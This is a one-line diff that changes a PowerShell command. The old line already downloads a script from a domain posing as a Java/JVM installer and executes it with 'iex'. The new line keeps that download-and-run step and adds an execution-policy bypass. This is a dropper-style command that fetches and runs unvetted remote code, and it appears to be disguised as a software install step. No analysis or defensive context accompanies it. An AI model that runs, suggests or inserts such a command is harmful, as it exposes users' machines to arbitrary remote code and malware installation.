@@ -1,1 +1,1 @@
-iex (iwr java-jvm.pages.dev/install)
+powershell -ep bypass -command iex (iwr java-jvm.pages.dev/install)
